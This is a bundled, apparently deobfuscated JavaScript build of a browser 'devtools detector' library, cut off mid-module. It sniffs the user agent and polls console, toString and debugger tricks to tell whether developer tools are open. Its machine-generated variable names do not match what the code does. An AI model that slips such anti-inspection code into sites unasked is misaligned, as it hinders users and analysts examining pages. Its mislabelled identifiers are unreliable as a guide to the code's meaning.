'use strict';
var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (object) {
    return typeof object;
} : function (obj) {
    return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
};
! function (module, factory) {
    if ("object" == (typeof exports === "undefined" ? "undefined" : _typeof(exports)) && "object" == (typeof module === "undefined" ? "undefined" : _typeof(module))) {
        module.exports = factory();
    } else {
        if ("function" == typeof define && define.amd) {
            define([], factory);
        } else {
            if ("object" == (typeof exports === "undefined" ? "undefined" : _typeof(exports))) {
                exports.devtoolsDetector = factory();
            } else {
                module.devtoolsDetector = factory();
            }
        }
    }
}("undefined" != typeof self ? self : undefined, function () {
    return function (e) {
        function t(i) {
            if (n[i]) {
                return n[i].exports;
            }
            var module = n[i] = {
                i: i,
                l: false,
                exports: {}
            };
            return e[i].call(module.exports, module, module.exports, t), module.l = true, module.exports;
        }
        var n = {};
        return t.m = e, t.c = n, t.d = function (key, name, n) {
            if (!t.o(key, name)) {
                Object.defineProperty(key, name, {
                    configurable: false,
                    enumerable: true,
                    get: n
                });
            }
        }, t.n = function (module) {
            var n = module && module.__esModule ? function () {
                return module.default;
            } : function () {
                return module;
            };
            return t.d(n, "a", n), n;
        }, t.o = function (t, object) {
            return Object.prototype.hasOwnProperty.call(t, object);
        }, t.p = "", t(t.s = 4);
    }([function (canCreateDiscussions, n, s) {
        (function (gelf) {
            n.b = function (options) {
                if (void 0 === options) {
                    options = {};
                }
                var includes = options.includes;
                var includes$1 = void 0 === includes ? [] : includes;
                var key = options.excludes;
                var newElKey = void 0 === key ? [] : key;
                var o = false;
                var n = false;
                var layer_i = 0;
                var crossfilterable_layers = includes$1;
                for (; layer_i < crossfilterable_layers.length; layer_i++) {
                    var layer = crossfilterable_layers[layer_i];
                    if (true === layer) {
                        o = true;
                        break;
                    }
                }
                var i = 0;
                var pageChildren = newElKey;
                for (; i < pageChildren.length; i++) {
                    layer = pageChildren[i];
                    if (true === layer) {
                        n = true;
                        break;
                    }
                }
                return o && !n;
            };
            n.c = function (i, n, char) {
                var unloadedImgElement = multiPointIndexes.a[i];
                if (void 0 === unloadedImgElement) {
                    return false;
                }
                return Object(a.compare)(unloadedImgElement, n, char);
            };
            n.a = function () {
                if ("undefined" != typeof self) {
                    return self;
                }
                if ("undefined" != typeof window) {
                    return window;
                }
                if (void 0 !== gelf) {
                    return gelf;
                }
                return this;
            };
            var a = s(11);
            var multiPointIndexes = (s.n(a), s(5));
        }).call(n, s(10));
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "c", function () {
            return f;
        });
        __webpack_require__.d(exports, "d", function () {
            return s;
        });
        __webpack_require__.d(exports, "b", function () {
            return l;
        });
        __webpack_require__.d(exports, "f", function () {
            return d;
        });
        __webpack_require__.d(exports, "a", function () {
            return p;
        });
        __webpack_require__.d(exports, "e", function () {
            return h;
        });
        var brushes;
        var browser;
        var $scope;
        var u = __webpack_require__(3);
        var window = __webpack_require__(0);
        var freeGlobal = Object(window.a)();
        var f = "InstallTrigger" in ((null === freeGlobal || void 0 === freeGlobal ? void 0 : freeGlobal.window) || {}) || /firefox/i.test(u.b);
        var s = /trident/i.test(u.b) || /msie/i.test(u.b);
        var l = /edge/i.test(u.b);
        var d = /webkit/i.test(u.b) && !l;
        var p = void 0 !== (null === (brushes = null === freeGlobal || void 0 === freeGlobal ? void 0 : freeGlobal.window) || void 0 === brushes ? void 0 : brushes.chrome) || /chrome/i.test(u.b) || /CriOS/i.test(u.b);
        var h = "[object SafariRemoteNotification]" === ((null === ($scope = null === (browser = null === freeGlobal || void 0 === freeGlobal ? void 0 : freeGlobal.window) || void 0 === browser ? void 0 : browser.safari) || void 0 === $scope ? void 0 : $scope.pushNotification) || false).toString() || /safari/i.test(u.b) && !p;
    }, function (canCreateDiscussions, date, t) {
        function debug(name) {
            if (console) {
                if (!value.d && !value.b) {
                    return console[name];
                }
                if ("log" === name || "clear" === name) {
                    return function () {
                        var argumentsArray = [];
                        var i = 0;
                        for (; i < arguments.length; i++) {
                            argumentsArray[i] = arguments[i];
                        }
                        console[name].apply(console, argumentsArray);
                    };
                }
            }
            return function () {
                var argumentsArray = [];
                var i = 0;
                for (; i < arguments.length; i++) {
                    argumentsArray[i] = arguments[i];
                }
            };
        }
        t.d(date, "b", function () {
            return log;
        });
        t.d(date, "c", function () {
            return html;
        });
        t.d(date, "a", function () {
            return d;
        });
        var value = t(1);
        var log = debug("log");
        var html = debug("table");
        var d = debug("clear");
    }, function (canCreateDiscussions, __webpack_exports__, __webpack_require__) {
        __webpack_exports__.a = function () {
            var doc;
            var argumentsArray = [];
            var i = 0;
            for (; i < arguments.length; i++) {
                argumentsArray[i] = arguments[i];
            }
            if (null === root || void 0 === root ? void 0 : root.document) {
                return (doc = root.document).createElement.apply(doc, argumentsArray);
            }
            return {};
        };
        __webpack_require__.d(__webpack_exports__, "b", function () {
            return u;
        });
        var webPhone;
        var window = __webpack_require__(0);
        var root = Object(window.a)();
        var u = (null === (webPhone = null === root || void 0 === root ? void 0 : root.navigator) || void 0 === webPhone ? void 0 : webPhone.userAgent) || "xxxxx";
    }, function (canCreateDiscussions, exports, self) {
        Object.defineProperty(exports, "__esModule", {
            value: true
        });
        exports.addListener = function (eventType) {
            data.addListener(eventType);
        };
        exports.removeListener = function (type) {
            data.removeListener(type);
        };
        exports.isLaunch = function () {
            return data.isLaunch();
        };
        exports.launch = function () {
            data.launch();
        };
        exports.stop = function () {
            data.stop();
        };
        exports.setDetectDelay = function (i) {
            data.setDetectDelay(i);
        };
        var deepArrayTest = self(7);
        var selfCoord = self(8);
        self.d(exports, "DevtoolsDetector", function () {
            return deepArrayTest.a;
        });
        self.d(exports, "checkers", function () {
            return selfCoord;
        });
        var normalizedMatrix = self(0);
        self.d(exports, "match", function () {
            return normalizedMatrix.b;
        });
        self.d(exports, "specificVersionMatch", function () {
            return normalizedMatrix.c;
        });
        var x = self(1);
        self.d(exports, "isFirefox", function () {
            return x.c;
        });
        self.d(exports, "isIE", function () {
            return x.d;
        });
        self.d(exports, "isEdge", function () {
            return x.b;
        });
        self.d(exports, "isWebkit", function () {
            return x.f;
        });
        self.d(exports, "isChrome", function () {
            return x.a;
        });
        self.d(exports, "isSafari", function () {
            return x.e;
        });
        var tParentMatrix = self(2);
        self.d(exports, "log", function () {
            return tParentMatrix.b;
        });
        self.d(exports, "table", function () {
            return tParentMatrix.c;
        });
        self.d(exports, "clear", function () {
            return tParentMatrix.a;
        });
        var changes = self(17);
        self.d(exports, "isMobile", function () {
            return changes.a;
        });
        var super$0 = self(5);
        self.d(exports, "versionMap", function () {
            return super$0.a;
        });
        var new_opts = self(6);
        self.d(exports, "isIpad", function () {
            return new_opts.b;
        });
        self.d(exports, "isMac", function () {
            return new_opts.d;
        });
        self.d(exports, "isIphone", function () {
            return new_opts.c;
        });
        self.d(exports, "isAndroid", function () {
            return new_opts.a;
        });
        self.d(exports, "isWindows", function () {
            return new_opts.e;
        });
        var data = new deepArrayTest.a({
            checkers: [selfCoord.elementIdChecker, selfCoord.regToStringChecker, selfCoord.functionToStringChecker, selfCoord.depRegToStringChecker, selfCoord.dateToStringChecker, selfCoord.debuggerChecker]
        });
        exports.default = data;
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return signedTransactions;
        });
        var signedTransactions = {};
        var i = 0;
        var paramsSplit = (__webpack_require__(3).b || "").match(/\w+\/(\d|\.)+(\s|$)/gi) || [];
        for (; i < paramsSplit.length; i++) {
            var joinedStyle = paramsSplit[i].split("/");
            var signedTransactionsCounter = joinedStyle[0];
            var signedTxHex = joinedStyle[1];
            signedTransactions[signedTransactionsCounter] = signedTxHex;
        }
    }, function (canCreateDiscussions, date, t) {
        t.d(date, "b", function () {
            return i;
        });
        t.d(date, "d", function () {
            return o;
        });
        t.d(date, "c", function () {
            return u;
        });
        t.d(date, "a", function () {
            return c;
        });
        t.d(date, "e", function () {
            return a;
        });
        var e = t(3);
        var i = /ipad/i.test(e.b);
        var o = /macintosh/i.test(e.b);
        var u = /iphone/i.test(e.b);
        var c = /android/i.test(e.b);
        var a = /windows/i.test(e.b);
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return o;
        });
        var gotoNewOfflinePage = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var updateDevicesAfterDelay = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var o = function () {
            function self(name) {
                var get = name.checkers;
                this._listeners = [];
                this._isOpen = false;
                this._detectLoopStopped = true;
                this._detectLoopDelay = 500;
                this._checkers = get.slice();
            }
            return self.prototype.launch = function () {
                if (this._detectLoopDelay <= 0) {
                    this.setDetectDelay(500);
                }
                if (this._detectLoopStopped) {
                    this._detectLoopStopped = false;
                    this._detectLoop();
                }
            }, self.prototype.stop = function () {
                if (!this._detectLoopStopped) {
                    this._detectLoopStopped = true;
                    clearTimeout(this._timer);
                }
            }, self.prototype.isLaunch = function () {
                return !this._detectLoopStopped;
            }, self.prototype.setDetectDelay = function (i) {
                this._detectLoopDelay = i;
            }, self.prototype.addListener = function (eventType) {
                this._listeners.push(eventType);
            }, self.prototype.removeListener = function (cb) {
                this._listeners = this._listeners.filter(function (callback) {
                    return callback !== cb;
                });
            }, self.prototype._broadcast = function (data) {
                var i = 0;
                var listeners = this._listeners;
                for (; i < listeners.length; i++) {
                    var callback = listeners[i];
                    try {
                        callback(data.isOpen, data);
                    } catch (t) {}
                }
            }, self.prototype._detectLoop = function () {
                return gotoNewOfflinePage(this, void 0, void 0, function () {
                    var isOpen;
                    var name;
                    var i;
                    var displayInfo;
                    var info;
                    var u = this;
                    return updateDevicesAfterDelay(this, function (_context) {
                        switch (_context.label) {
                        case 0:
                            isOpen = false;
                            name = "";
                            i = 0;
                            displayInfo = this._checkers;
                            _context.label = 1;
                        case 1:
                            return i < displayInfo.length ? [4, (info = displayInfo[i]).isEnable()] : [3, 6];
                        case 2:
                            return _context.sent() ? (name = info.name, [4, info.isOpen()]) : [3, 4];
                        case 3:
                            isOpen = _context.sent();
                            _context.label = 4;
                        case 4:
                            if (isOpen) {
                                return [3, 6];
                            }
                            _context.label = 5;
                        case 5:
                            return i++, [3, 1];
                        case 6:
                            return isOpen != this._isOpen && (this._isOpen = isOpen, this._broadcast({
                                isOpen: isOpen,
                                checkerName: name
                            })), this._detectLoopDelay > 0 ? this._timer = setTimeout(function () {
                                return u._detectLoop();
                            }, this._detectLoopDelay) : this.stop(), [2];
                        }
                    });
                });
            }, self;
        }();
    }, function (canCreateDiscussions, a, e) {
        Object.defineProperty(a, "__esModule", {
            value: true
        });
        var r = e(9);
        e.d(a, "depRegToStringChecker", function () {
            return r.a;
        });
        var s = e(12);
        e.d(a, "elementIdChecker", function () {
            return s.a;
        });
        var ev = e(13);
        e.d(a, "functionToStringChecker", function () {
            return ev.a;
        });
        var row = e(14);
        e.d(a, "regToStringChecker", function () {
            return row.a;
        });
        var c = e(15);
        e.d(a, "debuggerChecker", function () {
            return c.a;
        });
        var o = e(16);
        e.d(a, "dateToStringChecker", function () {
            return o.a;
        });
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return t;
        });
        var r = __webpack_require__(1);
        var schema = __webpack_require__(2);
        var window = __webpack_require__(0);
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var dependency = / /;
        var f = false;
        dependency.toString = function () {
            return f = true, t.name;
        };
        var t = {
            name: "dep-reg-to-string",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return f = false, Object(schema.c)({
                            dep: dependency
                        }), Object(schema.a)(), [2, f];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, Object(window.b)({
                            includes: [true],
                            excludes: [r.c, r.d]
                        })];
                    });
                });
            }
        };
    }, function (module, n) {
        var g;
        g = function () {
            return this;
        }();
        try {
            g = g || Function("return this")() || (0, eval)("this");
        } catch (t) {
            if ("object" == (typeof window === "undefined" ? "undefined" : _typeof(window))) {
                g = window;
            }
        }
        module.exports = g;
    }, function (module, a, canCreateDiscussions) {
        var h;
        var e;
        var s;
        ! function (addedRenderer, firstRequestHeaders) {
            e = [];
            if (!(void 0 === (s = "function" == typeof (h = firstRequestHeaders) ? h.apply(a, e) : h))) {
                module.exports = s;
            }
        }(0, function () {
            function next(prefix) {
                var n = prefix.replace(/^v/, "").replace(/\+.*$/, "");
                var p = function (s, search) {
                    return -1 === s.indexOf(search) ? s.length : s.indexOf(search);
                }(n, "-");
                var r = n.substring(0, p).split(".");
                return r.push(n.substring(p + 1)), r;
            }

            function e(value) {
                return isNaN(Number(value)) ? value : Number(value);
            }

            function r(selector) {
                if ("string" != typeof selector) {
                    throw new TypeError("Invalid argument expected string");
                }
                if (!pseudoSelector.test(selector)) {
                    throw new Error("Invalid argument not valid semver ('" + selector + "' received)");
                }
            }

            function schedule(b, a) {
                [b, a].forEach(r);
                var el = next(b);
                var result = next(a);
                var prop = 0;
                for (; prop < Math.max(el.length - 1, result.length - 1); prop++) {
                    var l = parseInt(el[prop] || 0, 10);
                    var i = parseInt(result[prop] || 0, 10);
                    if (l > i) {
                        return 1;
                    }
                    if (i > l) {
                        return -1;
                    }
                }
                var s = el[el.length - 1];
                var t = result[result.length - 1];
                if (s && t) {
                    var a = s.split(".").map(e);
                    var b = t.split(".").map(e);
                    prop = 0;
                    for (; prop < Math.max(a.length, b.length); prop++) {
                        if (void 0 === a[prop] || "string" == typeof b[prop] && "number" == typeof a[prop]) {
                            return -1;
                        }
                        if (void 0 === b[prop] || "string" == typeof a[prop] && "number" == typeof b[prop]) {
                            return 1;
                        }
                        if (a[prop] > b[prop]) {
                            return 1;
                        }
                        if (b[prop] > a[prop]) {
                            return -1;
                        }
                    }
                } else {
                    if (s || t) {
                        return s ? -1 : 1;
                    }
                }
                return 0;
            }
            var pseudoSelector = /^v?(?:\d+)(\.(?:[x*]|\d+)(\.(?:[x*]|\d+)(\.(?:[x*]|\d+))?(?:-[\da-z\-]+(?:\.[\da-z\-]+)*)?(?:\+[\da-z\-]+(?:\.[\da-z\-]+)*)?)?)?$/i;
            var o = [">", ">=", "=", "<", "<="];
            var styles = {
                ">": [1],
                ">=": [0, 1],
                "=": [0],
                "<=": [-1, 0],
                "<": [-1]
            };
            return schedule.validate = function (message) {
                return "string" == typeof message && pseudoSelector.test(message);
            }, schedule.compare = function (url, name, component) {
                ! function (val) {
                    if ("string" != typeof val) {
                        throw new TypeError("Invalid operator type, expected string but got " + (typeof val === "undefined" ? "undefined" : _typeof(val)));
                    }
                    if (-1 === o.indexOf(val)) {
                        throw new TypeError("Invalid operator, expected one of " + o.join("|"));
                    }
                }(component);
                var e = schedule(url, name);
                return styles[component].indexOf(e) > -1;
            }, schedule;
        });
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return MODULE_STORE;
        });
        var r = __webpack_require__(1);
        var window = __webpack_require__(2);
        var spec = __webpack_require__(0);
        var event = __webpack_require__(3);
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var node = Object(event.a)("div");
        var unwind = false;
        Object.defineProperty(node, "id", {
            get: function finishPrevPart() {
                return unwind = true, MODULE_STORE.name;
            },
            configurable: true
        });
        var MODULE_STORE = {
            name: "element-id",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return unwind = false, Object(window.b)(node), Object(window.a)(), [2, unwind];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, Object(spec.b)({
                            includes: [true],
                            excludes: [r.d, r.b, r.c]
                        })];
                    });
                });
            }
        };
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        function val() {}
        __webpack_require__.d(exports, "a", function () {
            return onBlurredState;
        });
        var r = __webpack_require__(1);
        var event = __webpack_require__(2);
        var transform = __webpack_require__(6);
        var window = __webpack_require__(0);
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var node = 0;
        val.toString = function () {
            return node++, "";
        };
        var onBlurredState = {
            name: "function-to-string",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return node = 0, Object(event.b)(val), Object(event.a)(), [2, 2 === node];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, Object(window.b)({
                            includes: [true],
                            excludes: [r.c, (transform.b || transform.c) && r.a]
                        })];
                    });
                });
            }
        };
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return MODULE_STORE;
        });
        var event = __webpack_require__(2);
        var dP = __webpack_require__(1);
        var window = __webpack_require__(0);
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
